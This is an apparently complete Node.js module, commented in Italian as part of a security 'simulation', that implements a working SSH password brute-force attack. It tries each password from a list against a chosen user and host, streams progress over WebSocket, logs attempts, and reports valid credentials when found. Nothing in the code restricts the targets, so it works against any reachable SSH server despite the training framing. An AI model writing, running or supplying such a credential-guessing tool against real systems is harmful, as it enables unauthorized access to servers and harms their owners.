// [COMMENTO ARCHITETTO DEVSECOPS]: Questo servizio è stato confermato come implementazione finale.
// È robusto, modulare e gestisce correttamente la concorrenza e gli errori, elementi
// fondamentali per una simulazione stabile e realistica. Non c'è bisogno di reinventare la ruota
// quando le fondamenta sono già solide.

const { Client } = require('ssh2');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const WebSocket = require('ws');

const config = require('../../config');

// --- Logger di Audit ---
// [COMMENTO ARCHITETTO]: Manteniamo un logger separato e specifico per le attività SSH.
// Fondamentale per il monitoraggio e il debriefing post-simulazione.
class SSHAuditLogger {
    constructor() {
        this.logDir = path.join(__dirname, '../../..', config.ssh_tool.log_dir);
        this.auditLogPath = path.join(this.logDir, 'ssh_audit.log');
        this.errorLogPath = path.join(this.logDir, 'ssh_errors.log');
        if (!fs.existsSync(this.logDir)) {
            fs.mkdirSync(this.logDir, { recursive: true });
        }
    }
    logEvent(event) {
        const logEntry = { timestamp: new Date().toISOString(), sessionId: event.sessionId || 'N/A', ...event };
        fs.appendFileSync(this.auditLogPath, JSON.stringify(logEntry) + '\n');
        if (event.level === 'error') {
            fs.appendFileSync(this.errorLogPath, JSON.stringify(logEntry) + '\n');
        }
    }
}

// --- Analizzatore di Errori SSH ---
// [COMMENTO ARCHITETTO]: Classificare gli errori permette all'interfaccia utente di fornire
// un feedback significativo invece di messaggi criptici.
class SSHErrorAnalyzer {
    static classify(err) {
        const errorMessage = err.message || err.toString();
        const errorPatterns = config.ssh_tool.error_patterns || {
            'All configured authentication methods failed': 'Credenziali errate',
            'Connection timed out': 'Timeout connessione',
            'ECONNREFUSED': 'Connessione rifiutata'
        };
        for (const [pattern, message] of Object.entries(errorPatterns)) {
            if (errorMessage.includes(pattern)) return { message };
        }
        return { message: `Errore non classificato: ${errorMessage}` };
    }
}

// --- Gestore Connessioni SSH ---
// [COMMENTO ARCHITETTO]: Logica di connessione isolata e riutilizzabile.
// La Promise gestisce l'intera logica di connessione, timeout ed errore in modo pulito.
class SSHConnectionManager {
    constructor(logger) { this.logger = logger; }
    testCredentials(host, port, username, password, sessionId) {
        return new Promise((resolve) => {
            const conn = new Client();
            let resolved = false;
            const startTime = Date.now();
            const timeout = setTimeout(() => {
                if (!resolved) { resolved = true; conn.end(); resolve({ success: false, error: 'Timeout connessione', duration: Date.now() - startTime }); }
            }, config.ssh_tool.connection_timeout);

            conn.on('ready', () => {
                if (resolved) return;
                clearTimeout(timeout);
                resolved = true;
                const duration = Date.now() - startTime;
                this.logger.logEvent({ level: 'success', event: 'SSH_LOGIN_SUCCESS', target: `${username}@${host}`, sessionId, duration });
                conn.end();
                resolve({ success: true, duration });
            });

            conn.on('error', (err) => {
                if (resolved) return;
                clearTimeout(timeout);
                resolved = true;
                const duration = Date.now() - startTime;
                const errorAnalysis = SSHErrorAnalyzer.classify(err);
                this.logger.logEvent({ level: 'error', event: 'SSH_LOGIN_FAILED', target: `${username}@${host}`, error: errorAnalysis.message, sessionId, duration });
                conn.end();
                resolve({ success: false, error: errorAnalysis.message, duration });
            });

            try {
                conn.connect({ host, port: parseInt(port), username, password, readyTimeout: config.ssh_tool.connection_timeout - 1000, algorithms: config.ssh_tool.algorithms, tryKeyboard: true });
            } catch (connectErr) {
                if (!resolved) { resolved = true; clearTimeout(timeout); resolve({ success: false, error: `Errore di connessione: ${connectErr.message}`, duration: Date.now() - startTime }); }
            }
        });
    }
}

// --- Sessione di Attacco ---
// [COMMENTO ARCHITETTO]: La classe principale che orchestra il ciclo di attacco.
// Gestisce lo stato (isActive), comunica con il frontend tramite WebSocket e
// implementa il rate-limiting tra un tentativo e l'altro.
class SSHAttackSession {
    constructor(ws, logger) { this.ws = ws; this.logger = logger; this.sshManager = new SSHConnectionManager(logger); this.sessionId = crypto.randomUUID(); this.isActive = false; }
    async start({ host, port, user, passwords }) {
        if (this.isActive) { this._sendMessage('error', 'Una sessione di attacco è già attiva.'); return; }
        if (!user || !host || !passwords || !Array.isArray(passwords) || passwords.length === 0) { this._sendMessage('error', 'Parametri di input non validi.'); return; }
        this.isActive = true;
        const targetPort = port || 22;
        this.logger.logEvent({ level: 'info', event: 'ATTACK_SESSION_START', target: `${user}@${host}:${targetPort}`, sessionId: this.sessionId, passwordCount: passwords.length });
        this._sendMessage('info', `🎯 Avvio sessione di attacco SSH su ${user}@${host}:${targetPort}`);
        
        let foundCredentials = null;
        for (let i = 0; i < passwords.length && this.isActive; i++) {
            this._sendProgress(i + 1, passwords.length);
            try {
                this._sendMessage('attack', `🔐 Tentativo ${i + 1}/${passwords.length} con utente '${user}'`);
                const result = await this.sshManager.testCredentials(host, targetPort, user, passwords[i], this.sessionId);
                if (result.success) {
                    foundCredentials = { username: user, password: passwords[i] };
                    this._sendResult(user, passwords[i]);
                    this._sendMessage('success', `✅ Credenziali valide trovate!`);
                    break;
                } else { this._sendMessage('error', `❌ ${result.error} (${result.duration}ms)`); }
            } catch (err) { this._sendMessage('error', `🚨 Errore critico durante l'attacco: ${err.message}`); }
            if (this.isActive && i < passwords.length - 1) await new Promise(res => setTimeout(res, config.ssh_tool.rate_limit_delay));
        }
        if (!foundCredentials && this.isActive) { this._sendMessage('info', '🔍 Scansione completata. Nessuna credenziale valida trovata.'); }
        this._send('finished', {});
        this.isActive = false;
    }
    stop() {
        if (!this.isActive) return;
        this.isActive = false;
        this.logger.logEvent({ level: 'warning', event: 'ATTACK_SESSION_STOPPED', sessionId: this.sessionId });
        this._sendMessage('warning', '🛑 Attacco interrotto manualmente dall\'utente.');
        this._send('finished', {});
    }
    _send(type, data) { if (this.ws.readyState === WebSocket.OPEN) this.ws.send(JSON.stringify({ type, sessionId: this.sessionId, ...data })); }
    _sendMessage(level, message) { this._send('log', { level, message }); }
    _sendProgress(current, total) { this._send('progress', { current, total, percentage: Math.round((current / total) * 100) }); }
    _sendResult(username, password) { this._send('found', { username, password }); }
}


// --- Funzione Esportata ---
function startSshAttackSession(ws, attackParams, logger) {
    const session = new SSHAttackSession(ws, logger);
    session.start(attackParams);
    return session;
}

module.exports = {
    startSshAttackSession,
    SSHAuditLogger
};